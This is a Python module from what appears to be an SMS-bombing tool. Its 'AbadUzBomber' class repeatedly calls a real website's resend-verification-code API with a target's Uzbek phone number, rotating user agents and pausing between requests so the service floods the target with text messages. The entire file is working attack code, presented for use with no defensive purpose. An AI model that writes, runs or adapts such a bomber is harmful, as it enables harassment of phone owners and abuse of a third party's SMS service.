import requests

import time

from .utils import random_user_agent
from .utils import FormattingOptions

fo = FormattingOptions()

class AbadUzBomber:
    def __init__(self, session: requests.Session) -> None:
        self.sess = session
        self.main_url = "https://py.abad.uz/v1.0/api/account/resendcode/"
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'User-Agent': random_user_agent(),
        }
        self.payloads = {'username': ''}

    def start_bombing(self, phone: str, amount: int = 1):
        print(fo._(fo.BOLD, "\nBu bomberda sal ko'proq kutish kerak.\nTo'xtatish uchun: [Ctrl]+[C]"))
        self.payloads['username'] = '+998' + phone
        
        for s in range(1, amount + 1):
            r = self.sess.post(
                url=self.main_url,
                headers=self.headers,
                data=self.payloads
            )

            r = 'Suck' if r.status_code in [200, 201] else 'Error'
            r = 'Error' if '10003' in r else r

            f = {'format':fo.OKGREEN, 'text': 'Muvaffaqiyatli!'} \
                if 'Error' not in r and isinstance(r, str) \
                else {'format': fo.FAIL, 'text': 'Muvaffaqiyatsiz!'}
            print(f"{fo._(fo.BOLD, str(s)+'|')} {fo._(f['format'], f['text'])}")

            time.sleep(30)
        else:
            print(fo._(fo.BOLD, '\nTugadi :)\n'))
